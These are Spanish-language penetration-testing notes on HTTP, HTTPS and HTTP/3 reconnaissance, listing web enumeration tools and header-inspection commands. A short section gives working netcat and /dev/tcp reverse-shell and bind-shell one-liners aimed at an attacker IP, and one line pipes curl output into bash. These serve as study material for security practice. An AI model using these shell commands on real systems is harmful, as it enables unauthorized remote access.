# HTTP 

Tags: #Web #Reconocimiento #Escaneo  #HTTP #HTTPS  #HTTP3 

## Códigos de estado 
* 200 -> OK
- 301 -> Moved Permanently (Follow Redirect)
- 401 -> Unauthorized
- 403 -> Forbidden
- 404 -> Not Found

## URL-Encode
* & = %26

❯ **Ctrl + u** Para ver el código fuente de la pagina web
❯ **Ctrl + r** Recargar la pagina web
❯ **Ctrl + Shift + c** Para inspeccionar el código 
❯ **Ctrl + Click-Izquierdo** Abrimos el enlace en otra pestaña

```bash
❯ http ❮IP❯                                       # Podemos ver las cabeceras 
```

```bash 
❯ browsh --startup-url http://IP/Default.aspx/    # Enumeracion del buscador de un IIS en fomra de GUI
❯ browsh --startup-url <IP>                       # Enumeracion del buscador de un Apache en fomra de GUI
```

```bash 
❯ lynx http://IP                                  # Enumeracion del buscador en fomra de GUI
```

```bash
❯ whatweb ❮http://IP❯                  # Nos dara una breve descripcion del gestor de contenidos del puerto 80

	# Mirar la jQuery
	# Servidor Web
```

```bash
❯ whatweb ❮http://IP:PORT❯             # Nos dara una breve descripcion del gestor de contenidos por un puerto especifico
```

```bash
❯ whatweb ❮http://❮IP❯ -v

	# v = Miramos las cabeceras de la pagina web, las cuales aveces nos revelan cosas
```

```bash 
❯ wig ❮http://❮IP❯                     # Web Information Gathered, nos reporta las versiones de los servicios en la web
```

```bash
❯ curl ❮IP❯ | bash                     # Lo que hace Curl es obtener un index.html del servidor y despues con el bash haremos que nos interprete la data en bash

❯ curl ❮IP❯ | more       

❯ curl http://IP/cgi-bin/ | more       # Miramos las cabeceras de ese directorio
```

```bash
❯ curl -s -X GET http://❮IP❯ -I        # Miramos las cabeceras de respuesta de la pagina web 

	# I = i mayuscula
	# s = silence
```

```bash 
❯ wget "http://IP/index"               # Obtenemos el archivo index 'descargamos'
```

## ReverShell y BindShell
Este comando lo ejecutamos desde la pagina web para hacer una **ReverShell** : 
1) Cuando tenemos Netcat 
2) Cuando no tenemos Netcat
```bash 
❯ nc -e /bin/bash IP-Atacante 443

❯ bash -i >& /dev/tcp/IP-Atacante/443 0>&1
```

```bash
❯ nc -nlvp 443 -e /bin/bash              # Ejecutamos desde la pagina web para ponernos en escucha y hacer una **BindShell** :
```


# HTTPS 
443 - Este puerto es también para la navegación web, pero en este caso usa el protocolo HTTPS que es seguro y utiliza el protocolo TLS por debajo.

```bash
❯ openssl s_client -connect ❮IP❯:443     # Para conectarnos al openssl e inspeccionar el certificado del puerto 443
```

```bash
❯ sslscan ❮IP❯:8443                      # Te da informacion del ssl de la maquina y si detecta alguna vulnerabilidad te la representa, podemos colocar el puerto si no es el comun 443
```

# HTTP3
* HTTP3 es la próxima y tercera versión principal del Protocolo de Transferencia de Hipertexto utilizado para intercambiar información en la World Wide Web, que sucederá a HTTP/2. HTTP/3 es un borrador basado en un RFC anterior, entonces nombrado "Protocolo de Transferencia de Hipertexto sobre QUIC". 
	* Protocolo **UDP**
	* [HTTP3-QUIC](https://github.com/cloudflare/quiche)
* Para poder usar la herramienta de arriba debemos de instalar lo siguiente:
	* [Rush](https://github.com/rust-lang/rustup/issues/686)

```bash
# Ruta para poder ejecutar el http3-client /home/user/quiche/target/debug/examples

❯ ./http3-client ❮https://127.0.0.1❯
```